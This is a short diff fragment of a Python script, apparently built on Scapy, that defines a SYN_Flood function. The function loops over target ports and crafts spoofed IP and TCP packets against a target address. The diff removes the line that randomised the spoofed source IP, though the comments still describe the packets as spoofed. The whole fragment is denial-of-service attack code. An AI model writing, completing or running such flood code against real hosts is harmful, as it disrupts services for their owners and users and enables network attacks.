@@ -24,7 +24,6 @@ def SYN_Flood(targetIP, numPackets, ports):
         for port in ports:
             # Create spoofed IP packet
             IP_Packet = IP()
-            IP_Packet.src = randomIP()
             IP_Packet.dst = targetIP
 
             # Create spoofed TCP Packet
